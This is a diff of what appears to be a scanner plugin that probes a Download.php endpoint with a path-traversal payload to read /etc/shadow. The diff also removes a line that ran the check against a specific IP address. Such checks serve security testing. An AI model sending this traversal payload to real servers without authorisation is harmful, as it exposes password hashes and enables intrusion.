@@ -15,8 +15,9 @@ def audit(arg):
     payload='commonplugin/Download.php?licensefile=../../../../../../../../../../etc/shadow'
     code, head, res, errcode, _ = curl.curl(url +payload )
     if code == 200  and "nobody" in res:
-            security_hole(url+payload)
+        security_hole(url+payload)
 
-if __name__ == '__main__':
+
+        return arg
+if __name__== '__main__':
     from dummy import *
-    audit(assign('ng-ags', 'https://121.28.81.124/')[1])
